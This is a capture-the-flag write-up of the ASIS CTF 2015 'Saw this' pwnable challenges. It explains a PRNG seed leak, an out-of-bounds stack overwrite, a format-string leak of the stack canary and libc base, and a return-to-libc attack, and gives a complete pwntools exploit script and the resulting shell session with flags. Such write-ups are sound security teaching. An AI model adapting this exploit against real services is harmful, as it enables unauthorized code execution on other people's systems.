---
title: ASIS CTF 2015 Quals -- Saw this (1 & 2)
tags:
  - ASIS
  - CTF
  - Pwnable
  - Python
  - format_string
  - C
categories:
  - write-ups
date: 2015-05-23 22:37:00
---
**Category:** pwn
**Points:** 100 (Saw this-1), 400 (Saw this-2)

> Survive and get the flag!
> Note: This challenge contains two flags, one of them is easier to fetch, the other is harder. 
> The easier flag will be clearly indicated as "Flag 1", the harder flag as "Flag 2"
> nc 87.107.123.3 31337

<!-- more -->

64 bit ELF. Lauch it with the almighty IDA Pro and press the powerful F5 key, we'll find that the service first ask us to input our user name and a lucky number. Then, it will use `srand` to set up the random number seed, and generate a random number sequence.  
```c
 srand(seed + lucky_number);
 v10 = 0;
 format = "YOU LOST THE GAME! IT'S OVER!";
 v8 = (signed int)floor(gen_rand_double() * 13.0 + 4.0);
 printf("I've thought of %d numbers. If you guess them correctly, you are free!\n", v8);
 
 for ( i = 0; i < v8; ++i )
    s[i] = (signed int)floor(gen_rand_double() * 256.0);
    
 for ( j = 0; j < v8; ++j )
 {
    printf("Number #%d: ", j + 1);
    v7[j] = read_lucky_number();
    v5 = memcmp(s, v7, 0x10uLL) == 0;
    if ( !v10 && v5 )
    {
      v10 = 1;
      format = "YOU WON! You are free now!";
    }
 }
 
 printf(format);
 if ( v10 != 1 )
    exit(0);
 print_freedom(); // get flag1
 do
 {
    printf("Do you want to play again (y/n)? ");
    read_input((__int64)&v12, 1);
    if ( v12 == 'y' || v12 == 'Y' )
      goto LABEL_4;
 }
 while ( v12 != 'n' && v12 != 'N' );
 return 0;
```

For **Saw this-1**, we'll have to try to guess all the random numbers. By investigating the memory, we found that our `user_name` start from `0x603108`, and the `seed` variable's at `0x603148`. Since it let us input at most 64 characters, we can leak the `seed` by input a `user_name` which length's 64 characters long. After we leak the `seed`, we can enter a `lucky_number` which cause the line `srand(seed + lucky_number);` into `srand(0)`. This will cause the server always generate a same group of random numbers, and so we can easily beat the game and get the flag1.

```
I've thought of 10 numbers. If you guess them correctly, you are free!
Number #1: 
[+] sending: 44
Number #2: 
[+] sending: 79
Number #3: 
[+] sending: 136
Number #4: 
[+] sending: 242
Number #5: 
[+] sending: 43
Number #6: 
[+] sending: 179
Number #7: 
[+] sending: 57
Number #8: 
[+] sending: 126
Number #9: 
[+] sending: 31
Number #10: 
[+] sending: 21
[*] Switching to interactive mode
YOU WON! You are free now!      _   _  _____ _ _____   _   _ _____ _____   _____ _   _ _____ _   _ 
     | | | ||  ___( )  ___| | \ | |  _  |_   _| |  ___| | | |  ___| \ | |
     | |_| || |__ |/\ `--.  |  \| | | | | | |   | |__ | | | | |__ |  \| |
     |  _  ||  __|   `--. \ | . ` | | | | | |   |  __|| | | |  __|| . ` |
     | | | || |___  /\__/ / | |\  \ \_/ / | |   | |___\ \_/ / |___| |\  |
     \_| |_/\____/  \____/  \_| \_/\___/  \_/   \____/ \___/\____/\_| \_/

.........[ascii art picture]......   

      _____ _   _   _____ _   _  _____  ______ _____ _____  _   _ _____ 
     |_   _| \ | | |_   _| | | ||  ___| | ___ \_   _|  __ \| | | |_   _|
       | | |  \| |   | | | |_| || |__   | |_/ / | | | |  \/| |_| | | |  
       | | | . ` |   | | |  _  ||  __|  |    /  | | | | __ |  _  | | |  
      _| |_| |\  |   | | | | | || |___  | |\ \ _| |_| |_\ \| | | | | |  
      \___/\_| \_/   \_/ \_| |_/\____/  \_| \_|\___/ \____/\_| |_/ \_/  
     
                  _____   ___   _____ _____ _      _____ 
                 /  __ \ / _ \ /  ___|_   _| |    |  ___|
                 | /  \// /_\ \\ `--.  | | | |    | |__  
                 | |    |  _  | `--. \ | | | |    |  __| 
                 | \__/\| | | |/\__/ / | | | |____| |___ 
                  \____/\_| |_/\____/  \_/ \_____/\____/ 



               Good job Mario, but your princess isn't here! 

                               Get a shell!


Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
```

For **Saw this-2**, we'll have to try to get a shell. The above pseudo code show us that there's a **format string vulnerability** in the program. It seems that the `format` variable is hard-coded in the program, we can't control it directly. But it's on the stack, so if we can find a way to overwrite the `format` pointer, we'll be able to trigger the format string vulnerability. 

It seems our only chance is to control the content of `v7[j]`. If `j` is big enough, we'll be able to overwrite all the vairables on the stack, **even the return address**. We found that `v8` (the variable holds the iteration number) is exactly at `v7[16]`. So we'll have to try to make `v8` >= 17, which is, making the return value of `(signed int)floor(gen_rand_double() * 13.0 + 4.0)` = 17.  

For random numbers, the only variable we can control is `lucky_number`. We'll have to find a proper number `N` = `seed` + `lucky_number`, and let `srand(N)` set the right random number seed so `(signed int)floor(gen_rand_double() * 13.0 + 4.0)` will be equal to 17. And so I wrote a C program to achieve the requirement: 

```c
#include <stdio.h>
#include <stdlib.h>
#include <math.h>

char statebuf[8];

double gen_rand_double()
{
    return (double)rand()/2147483647.0;
}

int main()
{
    initstate(0, statebuf, 8);
    unsigned int i, v8;

    for(i = 0 ; i<= 0xFFFFFFFF ; i++)
    {
        srand(i);
        v8 = (unsigned int)(gen_rand_double() * 13.0 + 4.0);
        if(v8 == 17)
        {
            puts("found!!");
            printf("i: %d\n", i);
            printf("0x%08x\n", i);
            break;
        }
        if(i == 2147483647) break;
    }
    puts("done");
    return 0;
}

```

The line `initstate(0, statebuf, 8)` is required to get the correct number, since the original binary has the exact same line of code in the initial process. Finally, we get `N` = `0x0dbdbb1e`

So now everytime we send a `lucky_number`, it has to be `0x0dbdbb1e` - `seed`. Since `v8` is set to 17 now, whenever we send the 17th number, `v8` will be modify to the number we send, which means we can control the iteration numbers, and so are the variables on the stack.  

Here are some important variables we'll have to modify (overwrite):
1. `v8`. The iteration number
2. `v10`. Overwrite it to **1** so we won't lose the game. 
3. `format`. Modify the pointer to the `user_name` buffer's address (`0x603108`). Now we can trigger the format string vulnerability.
    
Notice that other important variables (ex.`luck_number`) will have to remain the same value after you overwrite the stack. As for the format string payload, at first I try to use **%n** to write the memory, until I found that the service **won't let us input our user name for second time**. Since we can't reuse the vulnerability, I decided to leak the **stack canary** and the **return address** ( which returns to `__libc_start_main` ).

Now we have the stack canary and the libc address. We can use the libc address to calculate the libc's base address, and get the address of `system`, `pop rdi, ret` gadget and `/bin/sh` string pointer. After we have all the information, we can overwrite the stack canary and the return address to launch a return-2-libc attack.

To sum up, here's the exploitation of Saw this-2:
1. Brute-Force the `srand` seed so `v8`(the iteration number) can be set to `17`.
2. Overwrite `v7[16]` (=`v8`), so we can overwrite the variables on the stack.
3. Overwrite `format` to the `user_name` buffer so we can trigger the format string vulnerability.
4. Leak the stack canary & return address.
5. Use the return adress to calculate libc's base address, so we can get `system`, `pop rdi, ret` & `/bin/sh`'s address.
6. Overwrite the stack canary & return address to launch the return-2-libc attack.  


```python exp.py
from pwn import *
import time

HOST = "87.107.123.3"
PORT = 31337
libc = ELF("./libc.so.6")

guess = [124,34,77,-48,68,-36,70,-6,62,99,-86,66,17,58,77,11,53]

r = remote(HOST, PORT)

# name buffer address = 0x603108
# %21$p -0xfd - 0x1edb0 = libc_base
# %17$p = canary

#send name
print r.recvuntil("call you? ")
name = "%17$p.%21$p."
name = name.ljust(60, "A")
name = name.ljust(64, "B")
assert len(name) == 64
r.send(name)

# exploit PRNG
s = r.recvuntil("!\n")
print "s:", s
seed = u32(s[s.index(name)+64:s.index("!"):].zfill(4))
log.success("seed: "+hex(seed))
print r.recvuntil("on it: ")
lucky_number = 0x0dbdbb1e - seed
lucky_hex = hex(lucky_number & 0xffffffff)
lucky_str = lucky_hex[lucky_hex.index("0x")+2::].zfill(8)

assert len(lucky_str) == 8
lucky_byte1 = str(int(lucky_str[6:8:], 16))
lucky_byte2 = str(int(lucky_str[4:6:], 16))
lucky_byte3 = str(int(lucky_str[2:4:], 16))
lucky_byte4 = str(int(lucky_str[0:2:], 16))

log.success("sending luck_number: "+str(lucky_number))
log.success(hex(seed)+" + "+hex(lucky_number)+" = "+hex(lucky_number+seed))
r.send(str(lucky_number)+"\n")

# 0~15 to pass the first 16 numbers
for i in range(16):
    print r.recvuntil(": ")
    log.success("sending: "+str(guess[i]))
    r.send(str(guess[i])+"\n")

payloads = ["44",#17 byte, v8
            "0",#padding
            "0",#padding
            "0",#padding
            lucky_byte1,   # lucky number
            lucky_byte2,   # lucky number
            lucky_byte3,   # lucky number
            lucky_byte4,   # lucky number
           "1", # v10 for win
            "0",#padding
            "0",#padding
            "0",#padding
           "17", # i
            "0",#padding
            "0",#padding
            "0",#padding
           "0", # v12_1
            "0",#padding
            "0",#padding
            "0",#padding
           "0", # v12_2
            "0",#padding
            "0",#padding
            "0",#padding
            "8", #name_buf 0x08
            "49", #name_buf 0x31
            "96", #name_buf 0x60
            "0", #name_buf 0x00
           ]

payloads[0] = str(len(payloads) + 16)
# sending payload
for payload in payloads:
    print r.recvuntil(": ")
    log.success("sending: "+payload)
    r.send(payload+"\n")

s = r.recvuntil("BBBB")
canary = s.split(".")[0]
canary = "0x" + canary[canary.index("0x")+2::].rjust(16, "0")
libc_base = int(s.split(".")[1], 16) - 0xfd - 0x1edb0
log.success("canary: "+canary)
log.success("libc_base: "+hex(libc_base))

libc.address += libc_base
pop_rdi_ret = libc_base + 0x2024b # pop rdi, ret
bin_sh = libc_base + 0x14bc23     # pointer to /bin/sh
system_addr = libc.symbols['system']

log.success("pop_rdi_ret: "+hex(pop_rdi_ret))
log.success("/bin/sh: "+hex(bin_sh))
log.success("system: "+hex(system_addr))

canary_byte = []
for i in xrange(2, 17, 2):
    canary_byte.append( str(int(canary[i:i+2:], 16) ) )

r.send("y\n")

# 0~15 to pass the first 16 numbers
for i in range(16):
    print r.recvuntil(": ")
    log.success("sending: "+str(guess[i]))
    r.send(str(guess[i])+"\n")

payloads = ["52",# will be adjust later
            "0",#padding
            "0",#padding
            "0",#padding
            lucky_byte1,   # lucky number
            lucky_byte2,   # lucky number
            lucky_byte3,   # lucky number
            lucky_byte4,   # lucky number
           "1", # v10 for win
            "0",#padding
            "0",#padding
            "0",#padding
           "17", # i
            "0",#padding
            "0",#padding
            "0",#padding
           "0", # v12_1
            "0",#padding
            "0",#padding
            "0",#padding
           "0", # v12_2
            "0",#padding
            "0",#padding
            "0",#padding
            "8", #name_buf 0x08
            "49", #name_buf 0x31
            "96", #name_buf 0x60
            "0", #name_buf 0x00
           "0", # padding
            "0",#padding
            "0",#padding
            "0",#padding
            "168", #name_buf 0xa8
            "48", #name_buf 0x30
            "96", #name_buf 0x60
            "0", #name_buf 0x00
           "0", # padding
            "0",#padding
            "0",#padding
            "0",#padding
           canary_byte[7], # canary 1
           canary_byte[6], # canary 2
           canary_byte[5], # canary 3
           canary_byte[4], # canary 4
           canary_byte[3], # canary 5
           canary_byte[2], # canary 6
           canary_byte[1], # canary 7
           canary_byte[0], # canary 8
           "0", # padding1
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
           "0", # padding2
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
           "0", # padding3
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
            "0",#padding
           str(pop_rdi_ret & 0xff), # pop_rdi_ret
            str( (pop_rdi_ret >> 8 ) & 0xff), # pop_rdi_ret
            str( (pop_rdi_ret >> 16 ) & 0xff), # pop_rdi_ret
            str( (pop_rdi_ret >> 24 ) & 0xff), # pop_rdi_ret
            str( (pop_rdi_ret >> 32 ) & 0xff), # pop_rdi_ret
            str( (pop_rdi_ret >> 40 ) & 0xff), # pop_rdi_ret
            str( (pop_rdi_ret >> 48 ) & 0xff), # pop_rdi_ret
            str( (pop_rdi_ret >> 56 ) & 0xff), # pop_rdi_ret
           str(bin_sh & 0xff), # bin_sh
            str( (bin_sh >> 8 ) & 0xff), # bin_sh
            str( (bin_sh >> 16 ) & 0xff), # bin_sh
            str( (bin_sh >> 24 ) & 0xff), # bin_sh
            str( (bin_sh >> 32 ) & 0xff), # bin_sh
            str( (bin_sh >> 40 ) & 0xff), # bin_sh
            str( (bin_sh >> 48 ) & 0xff), # bin_sh
            str( (bin_sh >> 56 ) & 0xff), # bin_sh
           str(system_addr & 0xff), # system_addr
            str( (system_addr >> 8 ) & 0xff), # system_addr
            str( (system_addr >> 16 ) & 0xff), # system_addr
            str( (system_addr >> 24 ) & 0xff), # system_addr
            str( (system_addr >> 32 ) & 0xff), # system_addr
            str( (system_addr >> 40 ) & 0xff), # system_addr
            str( (system_addr >> 48 ) & 0xff), # system_addr
            str( (system_addr >> 56 ) & 0xff), # system_addr
           ]

payloads[0] = str(len(payloads) + 16)
# sending payload
for payload in payloads:
    print r.recvuntil(": ")
    log.success("sending: "+payload)
    r.send(payload+"\n")

r.interactive()

```

And Finally, we get the flag2:

```
               Good job Mario, but your princess isn't here! 

                               Get a shell!


Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
Do you want to play again (y/n)? $ n
$ ls
flag
freedom
sawthis
wrapper.sh
$ cat flag
7h15_ch4ll3ng3_g4v3_m3_br41n_c4nc3r

Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}

```

Brain cancer? LOL indeed, but it's still a great challenge!